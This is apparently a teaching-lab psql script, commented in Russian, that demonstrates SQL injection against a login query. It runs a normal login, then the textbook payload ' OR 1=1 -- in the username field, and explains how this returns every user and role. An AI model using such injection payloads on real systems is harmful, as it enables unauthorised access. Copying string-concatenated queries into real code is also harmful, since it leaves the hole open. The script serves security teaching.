-- Этап 2.1: демонстрация атаки на login() через конкатенацию
-- Нормальный сценарий: alice / alice123 → 1 строка
\echo === Нормальный логин (alice/alice123) ===
SELECT user_id, username, role_name FROM injection_lab.users
WHERE username = 'alice' AND password_plain = 'alice123';

-- Атака: вредоносный логин ' OR 1=1 -- + любой пароль
-- Итоговый запрос после конкатенации виден прямо в SQL ниже:
\echo === Атака: ввод username = ''' OR 1=1 --', password = (любой) ===
SELECT user_id, username, role_name FROM injection_lab.users
WHERE username = '' OR 1=1 --' AND password_plain = 'whatever';

-- Что произошло:
-- WHERE username = '' OR 1=1 --' AND password_plain = '...'
-- OR 1=1 истинно для всех, остаток после -- стал комментарием.
-- Атакующий получил список ВСЕХ пользователей с ролями.
